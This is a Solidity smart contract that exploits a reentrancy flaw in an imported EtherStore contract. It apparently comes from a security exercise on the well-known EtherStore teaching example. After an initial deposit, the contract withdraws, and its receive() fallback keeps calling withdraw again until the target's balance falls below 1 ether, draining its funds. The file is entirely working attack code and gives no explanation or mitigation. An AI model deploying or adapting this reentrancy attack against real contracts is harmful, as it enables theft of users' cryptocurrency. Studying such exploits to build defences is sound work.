// SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.5.0;

import './EtherStore.sol';

contract ExploitEtherStore {
  EtherStore public etherStore;

  constructor(address _etherStoreAddress) {
    etherStore = EtherStore(_etherStoreAddress);
  }

  function depositEther() public payable {
    etherStore.deposit{value: 1 ether}();
  }

  function exploit() external payable {
    require(msg.value > 1 ether, 'amount must be greater than 1 ETH');
    etherStore.deposit{value: 1 ether}();
    etherStore.withdraw(1 ether);
  }

  function getExploitBalance() public view returns(uint) {
    return address(this).balance;
  }

  receive() external payable {
    if(address(etherStore).balance >= 1 ether) {
      etherStore.withdraw(1 ether);

    }
  }

}